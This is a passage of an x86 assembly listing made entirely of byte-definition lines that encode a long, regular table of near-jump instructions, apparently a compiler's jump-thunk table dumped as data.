    db 27h,00h,00h,0E9h,0C7h,27h,00h,00h,0E9h,0C2h,27h,00h,00h,0E9h,0BDh,27h
    db 00h,00h,0E9h,0B8h,27h,00h,00h,0E9h,0B3h,27h,00h,00h,0E9h,0AEh,27h,00h
    db 00h,0E9h,0A9h,27h,00h,00h,0E9h,0A4h,27h,00h,00h,0E9h,9Fh,27h,00h,00h
    db 0E9h,9Ah,27h,00h,00h,0E9h,95h,27h,00h,00h,0E9h,90h,27h,00h,00h,0E9h
    db 8Bh,27h,00h,00h,0E9h,86h,27h,00h,00h,0E9h,81h,27h,00h,00h,0E9h,7Ch
    db 27h,00h,00h,0E9h,77h,27h,00h,00h,0E9h,72h,27h,00h,00h,0E9h,6Dh,27h
    db 00h,00h,0E9h,68h,27h,00h,00h,0E9h,63h,27h,00h,00h,0E9h,5Eh,27h,00h
    db 00h,0E9h,59h,27h,00h,00h,0E9h,54h,27h,00h,00h,0E9h,4Fh,27h,00h,00h
    db 0E9h,4Ah,27h,00h,00h,0E9h,45h,27h,00h,00h,0E9h,40h,27h,00h,00h,0E9h
    db 3Bh,27h,00h,00h,0E9h,36h,27h,00h,00h,0E9h,31h,27h,00h,00h,0E9h,2Ch
    db 27h,00h,00h,0E9h,27h,27h,00h,00h,0E9h,22h,27h,00h,00h,0E9h,1Dh,27h
    db 00h,00h,0E9h,18h,27h,00h,00h,0E9h,13h,27h,00h,00h,0E9h,0Eh,27h,00h
    db 00h,0E9h,09h,27h,00h,00h,0E9h,04h,27h,00h,00h,0E9h,0FFh,26h,00h,00h
    db 0E9h,0FAh,26h,00h,00h,0E9h,0F5h,26h,00h,00h,0E9h,0F0h,26h,00h,00h,0E9h
    db 0EBh,26h,00h,00h,0E9h,0E6h,26h,00h,00h,0E9h,0E1h,26h,00h,00h,0E9h,0DCh
    db 26h,00h,00h,0E9h,0D7h,26h,00h,00h,0E9h,0D2h,26h,00h,00h,0E9h,0CDh,26h
    db 00h,00h,0E9h,0C8h,26h,00h,00h,0E9h,0C3h,26h,00h,00h,0E9h,0BEh,26h,00h
    db 00h,0E9h,0B9h,26h,00h,00h,0E9h,0B4h,26h,00h,00h,0E9h,0AFh,26h,00h,00h
    db 0E9h,0AAh,26h,00h,00h,0E9h,0A5h,26h,00h,00h,0E9h,0A0h,26h,00h,00h,0E9h
    db 9Bh,26h,00h,00h,0E9h,96h,26h,00h,00h,0E9h,91h,26h,00h,00h,0E9h,8Ch
    db 26h,00h,00h,0E9h,87h,26h,00h,00h,0E9h,82h,26h,00h,00h,0E9h,7Dh,26h
    db 00h,00h,0E9h,78h,26h,00h,00h,0E9h,73h,26h,00h,00h,0E9h,6Eh,26h,00h
    db 00h,0E9h,69h,26h,00h,00h,0E9h,64h,26h,00h,00h,0E9h,5Fh,26h,00h,00h
    db 0E9h,5Ah,26h,00h,00h,0E9h,55h,26h,00h,00h,0E9h,50h,26h,00h,00h,0E9h
    db 4Bh,26h,00h,00h,0E9h,46h,26h,00h,00h,0E9h,41h,26h,00h,00h,0E9h,3Ch
    db 26h,00h,00h,0E9h,37h,26h,00h,00h,0E9h,32h,26h,00h,00h,0E9h,2Dh,26h
    db 00h,00h,0E9h,28h,26h,00h,00h,0E9h,23h,26h,00h,00h,0E9h,1Eh,26h,00h
    db 00h,0E9h,19h,26h,00h,00h,0E9h,14h,26h,00h,00h,0E9h,0Fh,26h,00h,00h
    db 0E9h,0Ah,26h,00h,00h,0E9h,05h,26h,00h,00h,0E9h,00h,26h,00h,00h,0E9h
    db 0FBh,25h,00h,00h,0E9h,0F6h,25h,00h,00h,0E9h,0F1h,25h,00h,00h,0E9h,0ECh
    db 25h,00h,00h,0E9h,0E7h,25h,00h,00h,0E9h,0E2h,25h,00h,00h,0E9h,0DDh,25h
    db 00h,00h,0E9h,0D8h,25h,00h,00h,0E9h,0D3h,25h,00h,00h,0E9h,0CEh,25h,00h
    db 00h,0E9h,0C9h,25h,00h,00h,0E9h,0C4h,25h,00h,00h,0E9h,0BFh,25h,00h,00h
    db 0E9h,0BAh,25h,00h,00h,0E9h,0B5h,25h,00h,00h,0E9h,0B0h,25h,00h,00h,0E9h
    db 0ABh,25h,00h,00h,0E9h,0A6h,25h,00h,00h,0E9h,0A1h,25h,00h,00h,0E9h,9Ch
    db 25h,00h,00h,0E9h,97h,25h,00h,00h,0E9h,92h,25h,00h,00h,0E9h,8Dh,25h
    db 00h,00h,0E9h,88h,25h,00h,00h,0E9h,83h,25h,00h,00h,0E9h,7Eh,25h,00h
    db 00h,0E9h,79h,25h,00h,00h,0E9h,74h,25h,00h,00h,0E9h,6Fh,25h,00h,00h
    db 0E9h,6Ah,25h,00h,00h,0E9h,65h,25h,00h,00h,0E9h,60h,25h,00h,00h,0E9h
    db 5Bh,25h,00h,00h,0E9h,56h,25h,00h,00h,0E9h,51h,25h,00h,00h,0E9h,4Ch
    db 25h,00h,00h,0E9h,47h,25h,00h,00h,0E9h,42h,25h,00h,00h,0E9h,3Dh,25h
    db 00h,00h,0E9h,38h,25h,00h,00h,0E9h,33h,25h,00h,00h,0E9h,2Eh,25h,00h
    db 00h,0E9h,29h,25h,00h,00h,0E9h,24h,25h,00h,00h,0E9h,1Fh,25h,00h,00h
    db 0E9h,1Ah,25h,00h,00h,0E9h,15h,25h,00h,00h,0E9h,10h,25h,00h,00h,0E9h
    db 0Bh,25h,00h,00h,0E9h,06h,25h,00h,00h,0E9h,01h,25h,00h,00h,0E9h,0FCh
    db 24h,00h,00h,0E9h,0F7h,24h,00h,00h,0E9h,0F2h,24h,00h,00h,0E9h,0EDh,24h
    db 00h,00h,0E9h,0E8h,24h,00h,00h,0E9h,0E3h,24h,00h,00h,0E9h,0DEh,24h,00h
    db 00h,0E9h,0D9h,24h,00h,00h,0E9h,0D4h,24h,00h,00h,0E9h,0CFh,24h,00h,00h
    db 0E9h,0CAh,24h,00h,00h,0E9h,0C5h,24h,00h,00h,0E9h,0C0h,24h,00h,00h,0E9h
    db 0BBh,24h,00h,00h,0E9h,0B6h,24h,00h,00h,0E9h,0B1h,24h,00h,00h,0E9h,0ACh
    db 24h,00h,00h,0E9h,0A7h,24h,00h,00h,0E9h,0A2h,24h,00h,00h,0E9h,9Dh,24h
    db 00h,00h,0E9h,98h,24h,00h,00h,0E9h,93h,24h,00h,00h,0E9h,8Eh,24h,00h
    db 00h,0E9h,89h,24h,00h,00h,0E9h,84h,24h,00h,00h,0E9h,7Fh,24h,00h,00h
    db 0E9h,7Ah,24h,00h,00h,0E9h,75h,24h,00h,00h,0E9h,70h,24h,00h,00h,0E9h
    db 6Bh,24h,00h,00h,0E9h,66h,24h,00h,00h,0E9h,61h,24h,00h,00h,0E9h,5Ch
    db 24h,00h,00h,0E9h,57h,24h,00h,00h,0E9h,52h,24h,00h,00h,0E9h,4Dh,24h
    db 00h,00h,0E9h,48h,24h,00h,00h,0E9h,43h,24h,00h,00h,0E9h,3Eh,24h,00h
    db 00h,0E9h,39h,24h,00h,00h,0E9h,34h,24h,00h,00h,0E9h,2Fh,24h,00h,00h
    db 0E9h,2Ah,24h,00h,00h,0E9h,25h,24h,00h,00h,0E9h,20h,24h,00h,00h,0E9h
    db 1Bh,24h,00h,00h,0E9h,16h,24h,00h,00h,0E9h,11h,24h,00h,00h,0E9h,0Ch
    db 24h,00h,00h,0E9h,07h,24h,00h,00h,0E9h,02h,24h,00h,00h,0E9h,0FDh,23h
    db 00h,00h,0E9h,0F8h,23h,00h,00h,0E9h,0F3h,23h,00h,00h,0E9h,0EEh,23h,00h
    db 00h,0E9h,0E9h,23h,00h,00h,0E9h,0E4h,23h,00h,00h,0E9h,0DFh,23h,00h,00h
    db 0E9h,0DAh,23h,00h,00h,0E9h,0D5h,23h,00h,00h,0E9h,0D0h,23h,00h,00h,0E9h
    db 0CBh,23h,00h,00h,0E9h,0C6h,23h,00h,00h,0E9h,0C1h,23h,00h,00h,0E9h,0BCh
    db 23h,00h,00h,0E9h,0B7h,23h,00h,00h,0E9h,0B2h,23h,00h,00h,0E9h,0ADh,23h
    db 00h,00h,0E9h,0A8h,23h,00h,00h,0E9h,0A3h,23h,00h,00h,0E9h,9Eh,23h,00h
    db 00h,0E9h,99h,23h,00h,00h,0E9h,94h,23h,00h,00h,0E9h,8Fh,23h,00h,00h
    db 0E9h,8Ah,23h,00h,00h,0E9h,85h,23h,00h,00h,0E9h,80h,23h,00h,00h,0E9h
    db 7Bh,23h,00h,00h,0E9h,76h,23h,00h,00h,0E9h,71h,23h,00h,00h,0E9h,6Ch
    db 23h,00h,00h,0E9h,67h,23h,00h,00h,0E9h,62h,23h,00h,00h,0E9h,5Dh,23h
    db 00h,00h,0E9h,58h,23h,00h,00h,0E9h,53h,23h,00h,00h,0E9h,4Eh,23h,00h
    db 00h,0E9h,49h,23h,00h,00h,0E9h,44h,23h,00h,00h,0E9h,3Fh,23h,00h,00h
    db 0E9h,3Ah,23h,00h,00h,0E9h,35h,23h,00h,00h,0E9h,30h,23h,00h,00h,0E9h
    db 2Bh,23h,00h,00h,0E9h,26h,23h,00h,00h,0E9h,21h,23h,00h,00h,0E9h,1Ch
    db 23h,00h,00h,0E9h,17h,23h,00h,00h,0E9h,12h,23h,00h,00h,0E9h,0Dh,23h
    db 00h,00h,0E9h,08h,23h,00h,00h,0E9h,03h,23h,00h,00h,0E9h,0FEh,22h,00h
    db 00h,0E9h,0F9h,22h,00h,00h,0E9h,0F4h,22h,00h,00h,0E9h,0EFh,22h,00h,00h
    db 0E9h,0EAh,22h,00h,00h,0E9h,0E5h,22h,00h,00h,0E9h,0E0h,22h,00h,00h,0E9h
    db 0DBh,22h,00h,00h,0E9h,0D6h,22h,00h,00h,0E9h,0D1h,22h,00h,00h,0E9h,0CCh
    db 22h,00h,00h,0E9h,0C7h,22h,00h,00h,0E9h,0C2h,22h,00h,00h,0E9h,0BDh,22h
    db 00h,00h,0E9h,0B8h,22h,00h,00h,0E9h,0B3h,22h,00h,00h,0E9h,0AEh,22h,00h
    db 00h,0E9h,0A9h,22h,00h,00h,0E9h,0A4h,22h,00h,00h,0E9h,9Fh,22h,00h,00h
    db 0E9h,9Ah,22h,00h,00h,0E9h,95h,22h,00h,00h,0E9h,90h,22h,00h,00h,0E9h
    db 8Bh,22h,00h,00h,0E9h,86h,22h,00h,00h,0E9h,81h,22h,00h,00h,0E9h,7Ch
    db 22h,00h,00h,0E9h,77h,22h,00h,00h,0E9h,72h,22h,00h,00h,0E9h,6Dh,22h
    db 00h,00h,0E9h,68h,22h,00h,00h,0E9h,63h,22h,00h,00h,0E9h,5Eh,22h,00h
    db 00h,0E9h,59h,22h,00h,00h,0E9h,54h,22h,00h,00h,0E9h,4Fh,22h,00h,00h
    db 0E9h,4Ah,22h,00h,00h,0E9h,45h,22h,00h,00h,0E9h,40h,22h,00h,00h,0E9h
    db 3Bh,22h,00h,00h,0E9h,36h,22h,00h,00h,0E9h,31h,22h,00h,00h,0E9h,2Ch
    db 22h,00h,00h,0E9h,27h,22h,00h,00h,0E9h,22h,22h,00h,00h,0E9h,1Dh,22h
    db 00h,00h,0E9h,18h,22h,00h,00h,0E9h,13h,22h,00h,00h,0E9h,0Eh,22h,00h
    db 00h,0E9h,09h,22h,00h,00h,0E9h,04h,22h,00h,00h,0E9h,0FFh,21h,00h,00h
    db 0E9h,0FAh,21h,00h,00h,0E9h,0F5h,21h,00h,00h,0E9h,0F0h,21h,00h,00h,0E9h
    db 0EBh,21h,00h,00h,0E9h,0E6h,21h,00h,00h,0E9h,0E1h,21h,00h,00h,0E9h,0DCh
    db 21h,00h,00h,0E9h,0D7h,21h,00h,00h,0E9h,0D2h,21h,00h,00h,0E9h,0CDh,21h
    db 00h,00h,0E9h,0C8h,21h,00h,00h,0E9h,0C3h,21h,00h,00h,0E9h,0BEh,21h,00h
    db 00h,0E9h,0B9h,21h,00h,00h,0E9h,0B4h,21h,00h,00h,0E9h,0AFh,21h,00h,00h
    db 0E9h,0AAh,21h,00h,00h,0E9h,0A5h,21h,00h,00h,0E9h,0A0h,21h,00h,00h,0E9h
    db 9Bh,21h,00h,00h,0E9h,96h,21h,00h,00h,0E9h,91h,21h,00h,00h,0E9h,8Ch
    db 21h,00h,00h,0E9h,87h,21h,00h,00h,0E9h,82h,21h,00h,00h,0E9h,7Dh,21h
    db 00h,00h,0E9h,78h,21h,00h,00h,0E9h,73h,21h,00h,00h,0E9h,6Eh,21h,00h
    db 00h,0E9h,69h,21h,00h,00h,0E9h,64h,21h,00h,00h,0E9h,5Fh,21h,00h,00h
    db 0E9h,5Ah,21h,00h,00h,0E9h,55h,21h,00h,00h,0E9h,50h,21h,00h,00h,0E9h
    db 4Bh,21h,00h,00h,0E9h,46h,21h,00h,00h,0E9h,41h,21h,00h,00h,0E9h,3Ch
    db 21h,00h,00h,0E9h,37h,21h,00h,00h,0E9h,32h,21h,00h,00h,0E9h,2Dh,21h
    db 00h,00h,0E9h,28h,21h,00h,00h,0E9h,23h,21h,00h,00h,0E9h,1Eh,21h,00h
    db 00h,0E9h,19h,21h,00h,00h,0E9h,14h,21h,00h,00h,0E9h,0Fh,21h,00h,00h
    db 0E9h,0Ah,21h,00h,00h,0E9h,05h,21h,00h,00h,0E9h,00h,21h,00h,00h,0E9h
    db 0FBh,20h,00h,00h,0E9h,0F6h,20h,00h,00h,0E9h,0F1h,20h,00h,00h,0E9h,0ECh
    db 20h,00h,00h,0E9h,0E7h,20h,00h,00h,0E9h,0E2h,20h,00h,00h,0E9h,0DDh,20h
    db 00h,00h,0E9h,0D8h,20h,00h,00h,0E9h,0D3h,20h,00h,00h,0E9h,0CEh,20h,00h
    db 00h,0E9h,0C9h,20h,00h,00h,0E9h,0C4h,20h,00h,00h,0E9h,0BFh,20h,00h,00h
    db 0E9h,0BAh,20h,00h,00h,0E9h,0B5h,20h,00h,00h,0E9h,0B0h,20h,00h,00h,0E9h
    db 0ABh,20h,00h,00h,0E9h,0A6h,20h,00h,00h,0E9h,0A1h,20h,00h,00h,0E9h,9Ch
    db 20h,00h,00h,0E9h,97h,20h,00h,00h,0E9h,92h,20h,00h,00h,0E9h,8Dh,20h
    db 00h,00h,0E9h,88h,20h,00h,00h,0E9h,83h,20h,00h,00h,0E9h,7Eh,20h,00h
    db 00h,0E9h,79h,20h,00h,00h,0E9h,74h,20h,00h,00h,0E9h,6Fh,20h,00h,00h
    db 0E9h,6Ah,20h,00h,00h,0E9h,65h,20h,00h,00h,0E9h,60h,20h,00h,00h,0E9h
    db 5Bh,20h,00h,00h,0E9h,56h,20h,00h,00h,0E9h,51h,20h,00h,00h,0E9h,4Ch
    db 20h,00h,00h,0E9h,47h,20h,00h,00h,0E9h,42h,20h,00h,00h,0E9h,3Dh,20h
    db 00h,00h,0E9h,38h,20h,00h,00h,0E9h,33h,20h,00h,00h,0E9h,2Eh,20h,00h
    db 00h,0E9h,29h,20h,00h,00h,0E9h,24h,20h,00h,00h,0E9h,1Fh,20h,00h,00h
    db 0E9h,1Ah,20h,00h,00h,0E9h,15h,20h,00h,00h,0E9h,10h,20h,00h,00h,0E9h
    db 0Bh,20h,00h,00h,0E9h,06h,20h,00h,00h,0E9h,01h,20h,00h,00h,0E9h,0FCh
    db 1Fh,00h,00h,0E9h,0F7h,1Fh,00h,00h,0E9h,0F2h,1Fh,00h,00h,0E9h,0EDh,1Fh
    db 00h,00h,0E9h,0E8h,1Fh,00h,00h,0E9h,0E3h,1Fh,00h,00h,0E9h,0DEh,1Fh,00h
    db 00h,0E9h,0D9h,1Fh,00h,00h,0E9h,0D4h,1Fh,00h,00h,0E9h,0CFh,1Fh,00h,00h
    db 0E9h,0CAh,1Fh,00h,00h,0E9h,0C5h,1Fh,00h,00h,0E9h,0C0h,1Fh,00h,00h,0E9h
    db 0BBh,1Fh,00h,00h,0E9h,0B6h,1Fh,00h,00h,0E9h,0B1h,1Fh,00h,00h,0E9h,0ACh
    db 1Fh,00h,00h,0E9h,0A7h,1Fh,00h,00h,0E9h,0A2h,1Fh,00h,00h,0E9h,9Dh,1Fh
    db 00h,00h,0E9h,98h,1Fh,00h,00h,0E9h,93h,1Fh,00h,00h,0E9h,8Eh,1Fh,00h
    db 00h,0E9h,89h,1Fh,00h,00h,0E9h,84h,1Fh,00h,00h,0E9h,7Fh,1Fh,00h,00h
    db 0E9h,7Ah,1Fh,00h,00h,0E9h,75h,1Fh,00h,00h,0E9h,70h,1Fh,00h,00h,0E9h
    db 6Bh,1Fh,00h,00h,0E9h,66h,1Fh,00h,00h,0E9h,61h,1Fh,00h,00h,0E9h,5Ch
    db 1Fh,00h,00h,0E9h,57h,1Fh,00h,00h,0E9h,52h,1Fh,00h,00h,0E9h,4Dh,1Fh
    db 00h,00h,0E9h,48h,1Fh,00h,00h,0E9h,43h,1Fh,00h,00h,0E9h,3Eh,1Fh,00h
    db 00h,0E9h,39h,1Fh,00h,00h,0E9h,34h,1Fh,00h,00h,0E9h,2Fh,1Fh,00h,00h
    db 0E9h,2Ah,1Fh,00h,00h,0E9h,25h,1Fh,00h,00h,0E9h,20h,1Fh,00h,00h,0E9h
    db 1Bh,1Fh,00h,00h,0E9h,16h,1Fh,00h,00h,0E9h,11h,1Fh,00h,00h,0E9h,0Ch
    db 1Fh,00h,00h,0E9h,07h,1Fh,00h,00h,0E9h,02h,1Fh,00h,00h,0E9h,0FDh,1Eh
    db 00h,00h,0E9h,0F8h,1Eh,00h,00h,0E9h,0F3h,1Eh,00h,00h,0E9h,0EEh,1Eh,00h
    db 00h,0E9h,0E9h,1Eh,00h,00h,0E9h,0E4h,1Eh,00h,00h,0E9h,0DFh,1Eh,00h,00h
    db 0E9h,0DAh,1Eh,00h,00h,0E9h,0D5h,1Eh,00h,00h,0E9h,0D0h,1Eh,00h,00h,0E9h
    db 0CBh,1Eh,00h,00h,0E9h,0C6h,1Eh,00h,00h,0E9h,0C1h,1Eh,00h,00h,0E9h,0BCh
    db 1Eh,00h,00h,0E9h,0B7h,1Eh,00h,00h,0E9h,0B2h,1Eh,00h,00h,0E9h,0ADh,1Eh
    db 00h,00h,0E9h,0A8h,1Eh,00h,00h,0E9h,0A3h,1Eh,00h,00h,0E9h,9Eh,1Eh,00h
    db 00h,0E9h,99h,1Eh,00h,00h,0E9h,94h,1Eh,00h,00h,0E9h,8Fh,1Eh,00h,00h
    db 0E9h,8Ah,1Eh,00h,00h,0E9h,85h,1Eh,00h,00h,0E9h,80h,1Eh,00h,00h,0E9h
    db 7Bh,1Eh,00h,00h,0E9h,76h,1Eh,00h,00h,0E9h,71h,1Eh,00h,00h,0E9h,6Ch
    db 1Eh,00h,00h,0E9h,67h,1Eh,00h,00h,0E9h,62h,1Eh,00h,00h,0E9h,5Dh,1Eh
    db 00h,00h,0E9h,58h,1Eh,00h,00h,0E9h,53h,1Eh,00h,00h,0E9h,4Eh,1Eh,00h
    db 00h,0E9h,49h,1Eh,00h,00h,0E9h,44h,1Eh,00h,00h,0E9h,3Fh,1Eh,00h,00h
    db 0E9h,3Ah,1Eh,00h,00h,0E9h,35h,1Eh,00h,00h,0E9h,30h,1Eh,00h,00h,0E9h
    db 2Bh,1Eh,00h,00h,0E9h,26h,1Eh,00h,00h,0E9h,21h,1Eh,00h,00h,0E9h,1Ch
    db 1Eh,00h,00h,0E9h,17h,1Eh,00h,00h,0E9h,12h,1Eh,00h,00h,0E9h,0Dh,1Eh
    db 00h,00h,0E9h,08h,1Eh,00h,00h,0E9h,03h,1Eh,00h,00h,0E9h,0FEh,1Dh,00h
    db 00h,0E9h,0F9h,1Dh,00h,00h,0E9h,0F4h,1Dh,00h,00h,0E9h,0EFh,1Dh,00h,00h
    db 0E9h,0EAh,1Dh,00h,00h,0E9h,0E5h,1Dh,00h,00h,0E9h,0E0h,1Dh,00h,00h,0E9h
    db 0DBh,1Dh,00h,00h,0E9h,0D6h,1Dh,00h,00h,0E9h,0D1h,1Dh,00h,00h,0E9h,0CCh
    db 1Dh,00h,00h,0E9h,0C7h,1Dh,00h,00h,0E9h,0C2h,1Dh,00h,00h,0E9h,0BDh,1Dh
    db 00h,00h,0E9h,0B8h,1Dh,00h,00h,0E9h,0B3h,1Dh,00h,00h,0E9h,0AEh,1Dh,00h
    db 00h,0E9h,0A9h,1Dh,00h,00h,0E9h,0A4h,1Dh,00h,00h,0E9h,9Fh,1Dh,00h,00h
    db 0E9h,9Ah,1Dh,00h,00h,0E9h,95h,1Dh,00h,00h,0E9h,90h,1Dh,00h,00h,0E9h
    db 8Bh,1Dh,00h,00h,0E9h,86h,1Dh,00h,00h,0E9h,81h,1Dh,00h,00h,0E9h,7Ch
    db 1Dh,00h,00h,0E9h,77h,1Dh,00h,00h,0E9h,72h,1Dh,00h,00h,0E9h,6Dh,1Dh
    db 00h,00h,0E9h,68h,1Dh,00h,00h,0E9h,63h,1Dh,00h,00h,0E9h,5Eh,1Dh,00h
    db 00h,0E9h,59h,1Dh,00h,00h,0E9h,54h,1Dh,00h,00h,0E9h,4Fh,1Dh,00h,00h
    db 0E9h,4Ah,1Dh,00h,00h,0E9h,45h,1Dh,00h,00h,0E9h,40h,1Dh,00h,00h,0E9h
    db 3Bh,1Dh,00h,00h,0E9h,36h,1Dh,00h,00h,0E9h,31h,1Dh,00h,00h,0E9h,2Ch
    db 1Dh,00h,00h,0E9h,27h,1Dh,00h,00h,0E9h,22h,1Dh,00h,00h,0E9h,1Dh,1Dh
    db 00h,00h,0E9h,18h,1Dh,00h,00h,0E9h,13h,1Dh,00h,00h,0E9h,0Eh,1Dh,00h
    db 00h,0E9h,09h,1Dh,00h,00h,0E9h,04h,1Dh,00h,00h,0E9h,0FFh,1Ch,00h,00h
    db 0E9h,0FAh,1Ch,00h,00h,0E9h,0F5h,1Ch,00h,00h,0E9h,0F0h,1Ch,00h,00h,0E9h
    db 0EBh,1Ch,00h,00h,0E9h,0E6h,1Ch,00h,00h,0E9h,0E1h,1Ch,00h,00h,0E9h,0DCh
    db 1Ch,00h,00h,0E9h,0D7h,1Ch,00h,00h,0E9h,0D2h,1Ch,00h,00h,0E9h,0CDh,1Ch
    db 00h,00h,0E9h,0C8h,1Ch,00h,00h,0E9h,0C3h,1Ch,00h,00h,0E9h,0BEh,1Ch,00h
    db 00h,0E9h,0B9h,1Ch,00h,00h,0E9h,0B4h,1Ch,00h,00h,0E9h,0AFh,1Ch,00h,00h
    db 0E9h,0AAh,1Ch,00h,00h,0E9h,0A5h,1Ch,00h,00h,0E9h,0A0h,1Ch,00h,00h,0E9h
    db 9Bh,1Ch,00h,00h,0E9h,96h,1Ch,00h,00h,0E9h,91h,1Ch,00h,00h,0E9h,8Ch
    db 1Ch,00h,00h,0E9h,87h,1Ch,00h,00h,0E9h,82h,1Ch,00h,00h,0E9h,7Dh,1Ch
    db 00h,00h,0E9h,78h,1Ch,00h,00h,0E9h,73h,1Ch,00h,00h,0E9h,6Eh,1Ch,00h
    db 00h,0E9h,69h,1Ch,00h,00h,0E9h,64h,1Ch,00h,00h,0E9h,5Fh,1Ch,00h,00h
    db 0E9h,5Ah,1Ch,00h,00h,0E9h,55h,1Ch,00h,00h,0E9h,50h,1Ch,00h,00h,0E9h
    db 4Bh,1Ch,00h,00h,0E9h,46h,1Ch,00h,00h,0E9h,41h,1Ch,00h,00h,0E9h,3Ch
    db 1Ch,00h,00h,0E9h,37h,1Ch,00h,00h,0E9h,32h,1Ch,00h,00h,0E9h,2Dh,1Ch
    db 00h,00h,0E9h,28h,1Ch,00h,00h,0E9h,23h,1Ch,00h,00h,0E9h,1Eh,1Ch,00h
    db 00h,0E9h,19h,1Ch,00h,00h,0E9h,14h,1Ch,00h,00h,0E9h,0Fh,1Ch,00h,00h
    db 0E9h,0Ah,1Ch,00h,00h,0E9h,05h,1Ch,00h,00h,0E9h,00h,1Ch,00h,00h,0E9h
    db 0FBh,1Bh,00h,00h,0E9h,0F6h,1Bh,00h,00h,0E9h,0F1h,1Bh,00h,00h,0E9h,0ECh
    db 1Bh,00h,00h,0E9h,0E7h,1Bh,00h,00h,0E9h,0E2h,1Bh,00h,00h,0E9h,0DDh,1Bh
    db 00h,00h,0E9h,0D8h,1Bh,00h,00h,0E9h,0D3h,1Bh,00h,00h,0E9h,0CEh,1Bh,00h
    db 00h,0E9h,0C9h,1Bh,00h,00h,0E9h,0C4h,1Bh,00h,00h,0E9h,0BFh,1Bh,00h,00h
    db 0E9h,0BAh,1Bh,00h,00h,0E9h,0B5h,1Bh,00h,00h,0E9h,0B0h,1Bh,00h,00h,0E9h
    db 0ABh,1Bh,00h,00h,0E9h,0A6h,1Bh,00h,00h,0E9h,0A1h,1Bh,00h,00h,0E9h,9Ch
    db 1Bh,00h,00h,0E9h,97h,1Bh,00h,00h,0E9h,92h,1Bh,00h,00h,0E9h,8Dh,1Bh
    db 00h,00h,0E9h,88h,1Bh,00h,00h,0E9h,83h,1Bh,00h,00h,0E9h,7Eh,1Bh,00h
    db 00h,0E9h,79h,1Bh,00h,00h,0E9h,74h,1Bh,00h,00h,0E9h,6Fh,1Bh,00h,00h
    db 0E9h,6Ah,1Bh,00h,00h,0E9h,65h,1Bh,00h,00h,0E9h,60h,1Bh,00h,00h,0E9h
    db 5Bh,1Bh,00h,00h,0E9h,56h,1Bh,00h,00h,0E9h,51h,1Bh,00h,00h,0E9h,4Ch
    db 1Bh,00h,00h,0E9h,47h,1Bh,00h,00h,0E9h,42h,1Bh,00h,00h,0E9h,3Dh,1Bh
    db 00h,00h,0E9h,38h,1Bh,00h,00h,0E9h,33h,1Bh,00h,00h,0E9h,2Eh,1Bh,00h
    db 00h,0E9h,29h,1Bh,00h,00h,0E9h,24h,1Bh,00h,00h,0E9h,1Fh,1Bh,00h,00h
    db 0E9h,1Ah,1Bh,00h,00h,0E9h,15h,1Bh,00h,00h,0E9h,10h,1Bh,00h,00h,0E9h
    db 0Bh,1Bh,00h,00h,0E9h,06h,1Bh,00h,00h,0E9h,01h,1Bh,00h,00h,0E9h,0FCh
    db 1Ah,00h,00h,0E9h,0F7h,1Ah,00h,00h,0E9h,0F2h,1Ah,00h,00h,0E9h,0EDh,1Ah
    db 00h,00h,0E9h,0E8h,1Ah,00h,00h,0E9h,0E3h,1Ah,00h,00h,0E9h,0DEh,1Ah,00h
    db 00h,0E9h,0D9h,1Ah,00h,00h,0E9h,0D4h,1Ah,00h,00h,0E9h,0CFh,1Ah,00h,00h
    db 0E9h,0CAh,1Ah,00h,00h,0E9h,0C5h,1Ah,00h,00h,0E9h,0C0h,1Ah,00h,00h,0E9h
    db 0BBh,1Ah,00h,00h,0E9h,0B6h,1Ah,00h,00h,0E9h,0B1h,1Ah,00h,00h,0E9h,0ACh
    db 1Ah,00h,00h,0E9h,0A7h,1Ah,00h,00h,0E9h,0A2h,1Ah,00h,00h,0E9h,9Dh,1Ah
    db 00h,00h,0E9h,98h,1Ah,00h,00h,0E9h,93h,1Ah,00h,00h,0E9h,8Eh,1Ah,00h
    db 00h,0E9h,89h,1Ah,00h,00h,0E9h,84h,1Ah,00h,00h,0E9h,7Fh,1Ah,00h,00h
    db 0E9h,7Ah,1Ah,00h,00h,0E9h,75h,1Ah,00h,00h,0E9h,70h,1Ah,00h,00h,0E9h
    db 6Bh,1Ah,00h,00h,0E9h,66h,1Ah,00h,00h,0E9h,61h,1Ah,00h,00h,0E9h,5Ch
    db 1Ah,00h,00h,0E9h,57h,1Ah,00h,00h,0E9h,52h,1Ah,00h,00h,0E9h,4Dh,1Ah
    db 00h,00h,0E9h,48h,1Ah,00h,00h,0E9h,43h,1Ah,00h,00h,0E9h,3Eh,1Ah,00h
    db 00h,0E9h,39h,1Ah,00h,00h,0E9h,34h,1Ah,00h,00h,0E9h,2Fh,1Ah,00h,00h
    db 0E9h,2Ah,1Ah,00h,00h,0E9h,25h,1Ah,00h,00h,0E9h,20h,1Ah,00h,00h,0E9h
    db 1Bh,1Ah,00h,00h,0E9h,16h,1Ah,00h,00h,0E9h,11h,1Ah,00h,00h,0E9h,0Ch
    db 1Ah,00h,00h,0E9h,07h,1Ah,00h,00h,0E9h,02h,1Ah,00h,00h,0E9h,0FDh,19h
    db 00h,00h,0E9h,0F8h,19h,00h,00h,0E9h,0F3h,19h,00h,00h,0E9h,0EEh,19h,00h
    db 00h,0E9h,0E9h,19h,00h,00h,0E9h,0E4h,19h,00h,00h,0E9h,0DFh,19h,00h,00h
    db 0E9h,0DAh,19h,00h,00h,0E9h,0D5h,19h,00h,00h,0E9h,0D0h,19h,00h,00h,0E9h
    db 0CBh,19h,00h,00h,0E9h,0C6h,19h,00h,00h,0E9h,0C1h,19h,00h,00h,0E9h,0BCh
    db 19h,00h,00h,0E9h,0B7h,19h,00h,00h,0E9h,0B2h,19h,00h,00h,0E9h,0ADh,19h
    db 00h,00h,0E9h,0A8h,19h,00h,00h,0E9h,0A3h,19h,00h,00h,0E9h,9Eh,19h,00h
    db 00h,0E9h,99h,19h,00h,00h,0E9h,94h,19h,00h,00h,0E9h,8Fh,19h,00h,00h
    db 0E9h,8Ah,19h,00h,00h,0E9h,85h,19h,00h,00h,0E9h,80h,19h,00h,00h,0E9h
    db 7Bh,19h,00h,00h,0E9h,76h,19h,00h,00h,0E9h,71h,19h,00h,00h,0E9h,6Ch
    db 19h,00h,00h,0E9h,67h,19h,00h,00h,0E9h,62h,19h,00h,00h,0E9h,5Dh,19h
    db 00h,00h,0E9h,58h,19h,00h,00h,0E9h,53h,19h,00h,00h,0E9h,4Eh,19h,00h
    db 00h,0E9h,49h,19h,00h,00h,0E9h,44h,19h,00h,00h,0E9h,3Fh,19h,00h,00h
    db 0E9h,3Ah,19h,00h,00h,0E9h,35h,19h,00h,00h,0E9h,30h,19h,00h,00h,0E9h
